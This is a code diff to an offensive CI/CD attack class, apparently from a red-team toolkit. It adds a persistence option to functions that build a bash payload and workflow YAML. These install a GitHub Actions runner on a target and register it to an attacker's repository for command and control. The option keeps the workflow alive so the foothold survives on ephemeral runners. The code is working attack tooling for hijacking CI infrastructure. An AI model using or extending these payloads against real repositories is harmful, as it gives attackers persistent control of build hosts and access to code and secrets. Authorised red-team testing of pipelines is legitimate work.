@@ -184,18 +184,21 @@ class CICDAttack():
 
     @staticmethod
     def create_ror_payload(registration_token: str, attacker_repo: str,
-                           runner_version: str):
+                           runner_version: str, persist_minutes: int = 0):
         """Generate the RoR runner installation bash payload.
 
         Args:
             registration_token (str): Runner registration token.
             attacker_repo (str): Attacker repo in org/repo format.
             runner_version (str): Runner release version (e.g. '2.332.0').
+            persist_minutes (int): Minutes to keep the workflow alive after
+                installing the runner. Useful for ephemeral runners where
+                the host is destroyed when the job ends. 0 = no persist.
 
         Returns:
             str: Bash script payload.
         """
-        return (
+        payload = (
             'RUNNER_NAME="gato-$(hostname)-$(date +%s)"\n'
             'ARCH=$(uname -m)\n'
             'case "$ARCH" in\n'
@@ -222,10 +225,19 @@ class CICDAttack():
             'echo "RoR runner installed: $RUNNER_NAME"'
         )
 
+        if persist_minutes > 0:
+            payload += (
+                f'\necho "Persisting for {persist_minutes} minutes..."\n'
+                f'sleep {persist_minutes * 60}'
+            )
+
+        return payload
+
     @staticmethod
     def create_ror_yml(registration_token: str, attacker_repo: str,
                        runner_version: str, branch_name: str,
-                       runner_labels: list = None):
+                       runner_labels: list = None,
+                       persist_minutes: int = 0):
         """Create a workflow that installs a GitHub Actions runner on the
         target, registered to the attacker's repo for C2.
 
@@ -236,12 +248,14 @@ class CICDAttack():
             branch_name (str): Branch for on:push trigger.
             runner_labels (list, optional): Labels for runs-on targeting.
             Defaults to ['self-hosted'].
+            persist_minutes (int): Minutes to keep workflow alive.
 
         Returns:
             str: Workflow YAML contents.
         """
         payload = CICDAttack.create_ror_payload(
-            registration_token, attacker_repo, runner_version
+            registration_token, attacker_repo, runner_version,
+            persist_minutes=persist_minutes
         )
 
         return CICDAttack.create_push_yml(payload, branch_name,
